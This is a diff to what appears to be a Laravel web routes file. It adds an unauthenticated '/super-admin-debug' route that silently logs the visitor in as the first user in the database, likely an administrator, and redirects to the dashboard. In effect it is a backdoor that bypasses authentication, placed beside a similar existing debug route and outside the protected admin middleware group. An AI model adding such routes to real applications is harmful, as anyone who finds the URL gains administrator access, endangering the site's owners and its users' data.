@@ -22,6 +22,14 @@ Route::get('/super-debug', function () {
     return redirect()->route('institute.students.index');
 });
 
+Route::get('/super-admin-debug', function () {
+    $admin = \App\Models\User::first();
+    if ($admin) {
+        \Illuminate\Support\Facades\Auth::guard('web')->login($admin);
+    }
+    return redirect()->route('dashboard');
+});
+
 // Admin Web Panel Routes (Jetstream/Auth)
 Route::middleware(array_filter([
     'auth:web',
